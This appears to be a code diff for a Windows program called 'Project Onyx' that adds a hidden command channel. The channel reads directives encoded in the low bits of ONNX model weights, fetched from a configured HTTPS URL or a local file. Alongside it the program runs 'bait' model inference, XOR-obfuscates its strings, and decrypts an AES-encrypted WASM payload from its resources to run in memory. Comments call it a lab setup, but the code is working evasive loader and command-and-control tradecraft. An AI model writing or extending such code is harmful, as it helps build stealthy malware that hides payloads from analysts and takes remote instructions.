+    const char magic[] = {'O', 'N', 'X', 'D', '1', '\n'};
+    if (raw.size() <= sizeof(magic) ||
+        std::memcmp(raw.data(), magic, sizeof(magic)) != 0)
+    {
+        return false;
+    }
+
+    std::string json(
+        reinterpret_cast<const char*>(raw.data() + sizeof(magic)),
+        raw.size() - sizeof(magic));
+    SensitiveStringGuard jsonGuard(json);
+    return ParseAndValidateDownlinkJson(json, directive);
+}
+
+static bool ExtractDownlinkDirectiveFromModelUpdate(
+    const void* referenceModelData,
+    size_t referenceModelSize,
+    const void* updateModelData,
+    size_t updateModelSize,
+    const std::string& hashPrompt,
+    DownlinkDirective& directive)
+{
+    FloatWeightSnapshot reference =
+        ExtractOnnxFloatWeightSnapshot(referenceModelData, referenceModelSize);
+    FloatWeightSnapshot update =
+        ExtractOnnxFloatWeightSnapshot(updateModelData, updateModelSize);
+
+    if (reference.values.empty() || update.values.empty() ||
+        reference.lsbBits.size() != reference.values.size() ||
+        update.lsbBits.size() != update.values.size())
+    {
+        return false;
+    }
+
+    std::vector<size_t> candidates =
+        NaturalDownlinkCandidatePositions(reference, update);
+    if (candidates.size() < 32)
+        return false;
+
+    std::vector<uint8_t> payload;
+    if (!ReadDownlinkRecordFromCandidates(update.lsbBits, candidates, hashPrompt, payload))
+        return false;
+
+    const std::string payloadText(
+        reinterpret_cast<const char*>(payload.data()),
+        payload.size());
+    const std::string magic = "ONXD1\n";
+    if (payloadText.rfind(magic, 0) != 0)
+        return false;
+
+    std::map<std::string, std::string> fields =
+        ParseKeyValueRecord(payloadText.substr(magic.size()));
+    return DirectiveFromDownlinkFields(fields, hashPrompt, directive);
+}
+
+static std::vector<uint8_t> ReadLocalFileBytesLimited(
+    const std::wstring& path,
+    size_t maxBytes)
+{
+    HandleGuard file;
+    file.h = CreateFileW(path.c_str(),
+                         GENERIC_READ,
+                         FILE_SHARE_READ,
+                         nullptr,
+                         OPEN_EXISTING,
+                         FILE_ATTRIBUTE_NORMAL,
+                         nullptr);
+    if (file.h == INVALID_HANDLE_VALUE)
+        ThrowWin32("CreateFileW(downlink)");
+
+    LARGE_INTEGER fileSize{};
+    if (!GetFileSizeEx(file.h, &fileSize))
+        ThrowWin32("GetFileSizeEx(downlink)");
+    if (fileSize.QuadPart <= 0 ||
+        static_cast<uint64_t>(fileSize.QuadPart) > static_cast<uint64_t>(maxBytes))
+    {
+        throw std::runtime_error("downlink: model update size rejected");
+    }
+
+    std::vector<uint8_t> bytes(static_cast<size_t>(fileSize.QuadPart));
+    size_t offset = 0;
+    while (offset < bytes.size())
+    {
+        DWORD chunk = static_cast<DWORD>(
+            (bytes.size() - offset) > 1024 * 1024
+                ? 1024 * 1024
+                : (bytes.size() - offset));
+        DWORD read = 0;
+        if (!ReadFile(file.h, bytes.data() + offset, chunk, &read, nullptr))
+            ThrowWin32("ReadFile(downlink)");
+        if (read == 0)
+            throw std::runtime_error("downlink: unexpected EOF");
+        offset += read;
+    }
+    return bytes;
+}
+
+static std::vector<uint8_t> GetBytesFromHttpsLimited(
+    const std::wstring& url,
+    size_t maxBytes)
+{
+    const ParsedHttpsUrl parsed = ParseHttpsUrl(url);
+    const std::wstring userAgent = XOR_W(L"ProjectOnyx/1.0");
+
+    WinHttpHandleGuard session;
+    session.h = WinHttpOpen(userAgent.c_str(),
+                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                            WINHTTP_NO_PROXY_NAME,
+                            WINHTTP_NO_PROXY_BYPASS,
+                            0);
+    if (!session.h) ThrowWin32("WinHttpOpen(downlink)");
+
+    WinHttpSetTimeouts(session.h, 1500, 1500, 5000, 5000);
+
+    WinHttpHandleGuard connection;
+    connection.h = WinHttpConnect(session.h, parsed.host.c_str(), parsed.port, 0);
+    if (!connection.h) ThrowWin32("WinHttpConnect(downlink)");
+
+    WinHttpHandleGuard request;
+    request.h = WinHttpOpenRequest(connection.h,
+                                   L"GET",
+                                   parsed.pathAndQuery.c_str(),
+                                   nullptr,
+                                   WINHTTP_NO_REFERER,
+                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                   WINHTTP_FLAG_SECURE);
+    if (!request.h) ThrowWin32("WinHttpOpenRequest(downlink)");
+
+    static constexpr wchar_t headers[] =
+        L"Accept: application/octet-stream\r\n";
+
+    if (!WinHttpSendRequest(request.h,
+                            headers,
+                            static_cast<DWORD>(-1),
+                            WINHTTP_NO_REQUEST_DATA,
+                            0,
+                            0,
+                            0))
+        ThrowWin32("WinHttpSendRequest(downlink)");
+
+    if (!WinHttpReceiveResponse(request.h, nullptr))
+        ThrowWin32("WinHttpReceiveResponse(downlink)");
+
+    DWORD statusCode = 0;
+    DWORD statusSize = sizeof(statusCode);
+    if (!WinHttpQueryHeaders(request.h,
+                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                             WINHTTP_HEADER_NAME_BY_INDEX,
+                             &statusCode,
+                             &statusSize,
+                             WINHTTP_NO_HEADER_INDEX))
+        ThrowWin32("WinHttpQueryHeaders(downlink)");
+
+    if (statusCode < 200 || statusCode >= 300)
+        return {};
+
+    std::vector<uint8_t> out;
+    for (;;)
+    {
+        DWORD available = 0;
+        if (!WinHttpQueryDataAvailable(request.h, &available))
+            ThrowWin32("WinHttpQueryDataAvailable(downlink)");
+        if (available == 0)
+            break;
+        if (out.size() + available > maxBytes)
+            throw std::runtime_error("downlink: HTTPS response too large");
+
+        const size_t base = out.size();
+        out.resize(base + available);
+        DWORD downloaded = 0;
+        if (!WinHttpReadData(request.h,
+                             out.data() + base,
+                             available,
+                             &downloaded))
+            ThrowWin32("WinHttpReadData(downlink)");
+        out.resize(base + downloaded);
+    }
+    return out;
+}
+
+static std::vector<uint8_t> LoadConfiguredDownlinkModelUpdate()
+{
+    static constexpr size_t kMaxDownlinkModelBytes = 25u * 1024u * 1024u;
+
+    const std::wstring pathEnv =
+        GetEnvVarW(XOR_W(L"PROJECT_ONYX_DOWNLINK_MODEL_PATH").c_str());
+    if (!pathEnv.empty())
+        return ReadLocalFileBytesLimited(pathEnv, kMaxDownlinkModelBytes);
+
+    const std::wstring urlEnv =
+        GetEnvVarW(XOR_W(L"PROJECT_ONYX_DOWNLINK_MODEL_URL").c_str());
+    if (!urlEnv.empty())
+        return GetBytesFromHttpsLimited(urlEnv, kMaxDownlinkModelBytes);
+
+    return {};
+}
+
+static void TryApplyConfiguredDownlink(
+    const ResourceView& referenceModel,
+    HostContext& hostCtx)
+{
+    try
+    {
+        std::vector<uint8_t> updateModel = LoadConfiguredDownlinkModelUpdate();
+        if (updateModel.empty())
+            return;
+
+        DownlinkDirective directive;
+        const bool ok = ExtractDownlinkDirectiveFromModelUpdate(
+            referenceModel.data,
+            static_cast<size_t>(referenceModel.size),
+            updateModel.data(),
+            updateModel.size(),
+            hostCtx.fingerprint,
+            directive);
+        SecureZeroVector(updateModel);
+        if (!ok)
+            return;
+
+        if (directive.type == "heartbeat_ack")
+            hostCtx.status = XOR_A("heartbeat_ack");
+        else if (directive.type == "set_status")
+            hostCtx.status = directive.status;
+    }
+    catch (...)
+    {
+        // Authentication failures, unrelated model updates, network failures,
+        // and malformed inputs are intentionally ignored in the lab downlink.
+    }
+}
+
 static std::string NormalizeAesKeyMaterial(const std::string& modelOutput)
 {
     std::string keyMaterial;
@@ -1154,51 +2285,174 @@ static void RunOnnxBaitWorkload(
     Ort::AllocatorWithDefaultOptions& allocator,
     const std::string& hashPrompt)
 {
-    if (session.GetInputCount() < 2 || session.GetOutputCount() < 1)
+    const size_t inputCount = session.GetInputCount();
+    if (inputCount < 1 || session.GetOutputCount() < 1)
         return;
-
-    std::array<int64_t, 16> inputIds{};
-    std::array<int64_t, 16> attentionMask{};
-    for (size_t i = 0; i < inputIds.size(); ++i)
-    {
-        inputIds[i] = (i < hashPrompt.size())
-            ? static_cast<int64_t>(static_cast<unsigned char>(hashPrompt[i]))
-            : 0;
-        attentionMask[i] = (i < hashPrompt.size()) ? 1 : 0;
-    }
-
-    const std::array<int64_t, 2> shape = {1, 16};
-    Ort::MemoryInfo memInfo =
-        Ort::MemoryInfo::CreateCpu(OrtArenaAllocator, OrtMemTypeDefault);
-
-    std::vector<Ort::Value> inputs;
-    inputs.emplace_back(Ort::Value::CreateTensor<int64_t>(
-        memInfo, inputIds.data(), inputIds.size(), shape.data(), shape.size()));
-    inputs.emplace_back(Ort::Value::CreateTensor<int64_t>(
-        memInfo, attentionMask.data(), attentionMask.size(), shape.data(), shape.size()));
-
-    Ort::AllocatedStringPtr in0 = session.GetInputNameAllocated(0, allocator);
-    Ort::AllocatedStringPtr in1 = session.GetInputNameAllocated(1, allocator);
-    Ort::AllocatedStringPtr out0 = session.GetOutputNameAllocated(0, allocator);
-
-    const std::array<const char*, 2> inputNames = {in0.get(), in1.get()};
-    const char* outputName = out0.get();
 
     try
     {
-        (void)session.Run(
-            Ort::RunOptions{nullptr},
-            inputNames.data(), inputs.data(), inputs.size(),
-            &outputName, 1);
+        size_t passes = 16;
+        const std::wstring passesEnv =
+            GetEnvVarW(XOR_W(L"PROJECT_ONYX_ONNX_TELEMETRY_PASSES").c_str());
+        if (!passesEnv.empty())
+        {
+            size_t parsed = 0;
+            bool valid = true;
+            for (wchar_t ch : passesEnv)
+            {
+                if (ch < L'0' || ch > L'9')
+                {
+                    valid = false;
+                    break;
+                }
+                parsed = parsed * 10u + static_cast<size_t>(ch - L'0');
+                if (parsed > 128u)
+                {
+                    parsed = 128u;
+                    break;
+                }
+            }
+            if (valid && parsed > 0)
+                passes = parsed;
+        }
+
+        std::vector<Ort::AllocatedStringPtr> inputNamePtrs;
+        std::vector<const char*> inputNames;
+        inputNamePtrs.reserve(inputCount);
+        inputNames.reserve(inputCount);
+        for (size_t i = 0; i < inputCount; ++i)
+        {
+            inputNamePtrs.emplace_back(session.GetInputNameAllocated(i, allocator));
+            inputNames.push_back(inputNamePtrs.back().get());
+        }
+
+        Ort::AllocatedStringPtr out0 = session.GetOutputNameAllocated(0, allocator);
+        const char* outputName = out0.get();
+        Ort::MemoryInfo memInfo =
+            Ort::MemoryInfo::CreateCpu(OrtArenaAllocator, OrtMemTypeDefault);
+
+        struct InputSpec
+        {
+            ONNXTensorElementDataType type;
+            std::vector<int64_t> shape;
+        };
+
+        std::vector<InputSpec> specs;
+        specs.reserve(inputCount);
+        for (size_t i = 0; i < inputCount; ++i)
+        {
+            Ort::TypeInfo typeInfo = session.GetInputTypeInfo(i);
+            auto tensorInfo = typeInfo.GetTensorTypeAndShapeInfo();
+            std::vector<int64_t> shape = tensorInfo.GetShape();
+            if (shape.empty())
+                shape.push_back(1);
+            if (shape.size() == 4)
+            {
+                shape[0] = 1;
+                if (shape[1] <= 0) shape[1] = 3;
+                if (shape[2] <= 0) shape[2] = 224;
+                if (shape[3] <= 0) shape[3] = 224;
+            }
+            else if (shape.size() == 2)
+            {
+                shape[0] = 1;
+                if (shape[1] <= 0) shape[1] = 16;
+            }
+            else
+            {
+                for (int64_t& dim : shape)
+                    if (dim <= 0) dim = 1;
+            }
+            specs.push_back(InputSpec{tensorInfo.GetElementType(), shape});
+        }
+
+        for (size_t pass = 0; pass < passes; ++pass)
+        {
+            std::vector<std::vector<float>> floatBuffers;
+            std::vector<std::vector<int64_t>> int64Buffers;
+            std::vector<Ort::Value> inputs;
+            floatBuffers.reserve(inputCount);
+            int64Buffers.reserve(inputCount);
+            inputs.reserve(inputCount);
+
+            for (size_t inputIndex = 0; inputIndex < inputCount; ++inputIndex)
+            {
+                const std::vector<int64_t>& shape = specs[inputIndex].shape;
+                size_t elementCount = 1;
+                for (int64_t dim : shape)
+                {
+                    if (dim <= 0 || dim > 4096)
+                        throw std::runtime_error("ONNX bait: unsupported input shape");
+                    elementCount *= static_cast<size_t>(dim);
+                    if (elementCount > 8u * 1024u * 1024u)
+                        throw std::runtime_error("ONNX bait: input tensor too large");
+                }
+
+                if (specs[inputIndex].type == ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT)
+                {
+                    floatBuffers.emplace_back(elementCount);
+                    std::vector<float>& buffer = floatBuffers.back();
+                    for (size_t i = 0; i < elementCount; ++i)
+                    {
+                        const unsigned char fpByte = hashPrompt.empty()
+                            ? 0
+                            : static_cast<unsigned char>(
+                                  hashPrompt[(i + pass + inputIndex) % hashPrompt.size()]);
+                        const float unit = static_cast<float>(
+                            ((i * 131u) + (pass * 17u) + fpByte) % 255u) / 255.0f;
+
+                        if (shape.size() == 4 && shape[1] == 3)
+                        {
+                            const size_t plane = static_cast<size_t>(shape[2] * shape[3]);
+                            const size_t channel = (i / plane) % 3u;
+                            const float means[3] = {0.485f, 0.456f, 0.406f};
+                            const float stds[3] = {0.229f, 0.224f, 0.225f};
+                            buffer[i] = (unit - means[channel]) / stds[channel];
+                        }
+                        else
+                        {
+                            buffer[i] = unit;
+                        }
+                    }
+                    inputs.emplace_back(Ort::Value::CreateTensor<float>(
+                        memInfo, buffer.data(), buffer.size(), shape.data(), shape.size()));
+                }
+                else if (specs[inputIndex].type == ONNX_TENSOR_ELEMENT_DATA_TYPE_INT64)
+                {
+                    int64Buffers.emplace_back(elementCount);
+                    std::vector<int64_t>& buffer = int64Buffers.back();
+                    for (size_t i = 0; i < elementCount; ++i)
+                    {
+                        const unsigned char fpByte = hashPrompt.empty()
+                            ? 0
+                            : static_cast<unsigned char>(
+                                  hashPrompt[(i + pass + inputIndex) % hashPrompt.size()]);
+                        buffer[i] = static_cast<int64_t>((fpByte + i + pass) & 0x7F);
+                    }
+                    inputs.emplace_back(Ort::Value::CreateTensor<int64_t>(
+                        memInfo, buffer.data(), buffer.size(), shape.data(), shape.size()));
+                }
+                else
+                {
+                    throw std::runtime_error("ONNX bait: unsupported input tensor type");
+                }
+            }
+
+            (void)session.Run(
+                Ort::RunOptions{nullptr},
+                inputNames.data(), inputs.data(), inputs.size(),
+                &outputName, 1);
+        }
     }
     catch (...)
     {
-        // Bait inference is intentionally non-critical. Metadata unlocking
-        // remains the authoritative path for key material.
+        const std::wstring strict =
+            GetEnvVarW(XOR_W(L"PROJECT_ONYX_REQUIRE_ONNX_TELEMETRY").c_str());
+        if (strict == L"1" || strict == L"true" || strict == L"TRUE")
+            throw;
+        // Bait inference is non-critical by default. In lab verification,
+        // PROJECT_ONYX_REQUIRE_ONNX_TELEMETRY=1 makes failures hard-fail.
     }
-
-    SecureZeroMemory(inputIds.data(), inputIds.size() * sizeof(inputIds[0]));
-    SecureZeroMemory(attentionMask.data(), attentionMask.size() * sizeof(attentionMask[0]));
 }
 
 static std::string UnlockKeyMaterialFromOnnxVault(
@@ -1219,6 +2473,16 @@ static std::string UnlockKeyMaterialFromOnnxVault(
     Ort::Session session(env, modelData, modelSize, opts);
     Ort::AllocatorWithDefaultOptions allocator;
     RunOnnxBaitWorkload(session, allocator, hashPrompt);
+
+    try
+    {
+        return UnlockKeyMaterialFromOnnxWeightVault(modelData, modelSize, hashPrompt);
+    }
+    catch (const std::exception&)
+    {
+        // Backward compatibility: older generated assets only contain the
+        // authenticated metadata vault. New assets prefer the weight vault.
+    }
 
     Ort::ModelMetadata metadata = session.GetModelMetadata();
     const std::string schema = LookupOnnxMetadata(metadata, allocator, "schema");
@@ -1583,19 +2847,23 @@ int main()
             hostCtx.fingerprint);
         SensitiveStringGuard aesKeyGuard(aesKeyMaterial);
 
-        // -- Phase 3: encrypted WASM from .rsrc - AES-256-CBC - RAM -----------
+        // -- Phase 3: ONNX model-update downlink -----------------------
+        TryApplyConfiguredDownlink(modelResource, hostCtx);
+
+        // -- Phase 4: encrypted WASM from .rsrc - AES-256-CBC - RAM -----------
         const ResourceView encryptedWasmResource = LoadResourceView(IDR_WASM_ENCRYPTED);
         std::vector<uint8_t> wasmBytes =
             DecryptAes256Cbc(encryptedWasmResource, aesKeyMaterial);
         SensitiveBytesGuard wasmGuard(wasmBytes);
         SecureZeroString(aesKeyMaterial);
 
-        // -- Phase 4: Wasm3 with host functions - JSON from the WASM module ---
+        // -- Phase 5: Wasm3 with host functions - JSON from the WASM module ---
         ExecuteWasmFromMemory(wasmBytes, hostCtx, "run");
 
         // hostCtx.resultJson now contains JSON assembled by WASM, for example:
         // {"status":"alive_and_secure","ts":"2026-05-05T12:00:00Z","fp":"a3f9..."}
         SecureZeroVector(wasmBytes);
+        WriteLabHeartbeatOutputIfConfigured(hostCtx);
 
         if (!hostCtx.webhookPosted)
         {
